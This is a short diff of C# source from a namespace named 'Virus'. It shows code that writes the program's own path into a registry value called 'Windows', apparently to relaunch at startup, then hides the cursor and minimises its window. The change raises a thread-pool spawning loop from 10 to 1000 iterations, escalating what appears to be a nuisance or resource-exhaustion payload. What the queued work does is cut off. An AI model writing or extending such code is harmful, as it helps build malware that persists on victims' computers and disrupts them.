@@ -19,7 +19,7 @@ namespace Virus
             rk.SetValue("Windows", Application.ExecutablePath);
             Cursor.Hide();
             this.WindowState = FormWindowState.Minimized;
-            for (int i = 0; i < 10; i++)
+            for (int i = 0; i < 1000; i++)
             {
                 ThreadPool.QueueUserWorkItem(new WaitCallback((a) =>
                 {
